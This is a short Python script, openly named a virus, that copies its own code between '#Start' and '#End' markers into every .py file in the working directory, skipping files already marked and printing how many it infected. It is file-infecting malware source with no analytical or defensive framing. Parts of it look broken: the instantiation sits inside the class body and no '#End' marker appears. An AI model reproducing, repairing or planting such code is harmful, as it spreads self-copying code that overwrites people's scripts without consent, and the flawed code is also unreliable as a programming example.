#Start
import sys, glob
from threading import *

class Virus(Thread):
    def run(self):
        Code = []
        with open(sys.argv[0], 'r') as f:
            lines = f.readlines()

        print('Searching for virus to copy')
        replicate = False
        for i in lines:
            if i == '#Start\n':
                replicate = True
                print('Success!')
            if replicate:
                Code.append(i)
            if i == '#End\n':
                break

        scripts = glob.glob('*.py')
        print('searching for files!')
        infections = 0
        alreadyInfected = -1
        toCheck = len(scripts) - 1
        for script in scripts:
            with open(script, 'r') as f:
                scriptCode = f.readlines()
            infectedCode = []
            infectedCode.extend(Code)
            infectedCode.extend('\n')
            infectedCode.extend(scriptCode)
            infectedCode.extend('\n')
            infectedCode.extend('virus.join()')
            infected = False
            for lines in scriptCode:
                if lines == '#Start\n':
                    infected = True
                    alreadyInfected = alreadyInfected + 1
                    break
            if not infected:
                with open(script, 'w') as f:
                    f.writelines(infectedCode)
                    infections = infections + 1
            print(f'Tested: {toCheck} \n Infections: {infections}\n Already infected: {alreadyInfected}')

    Virus = Virus()

Virus.start()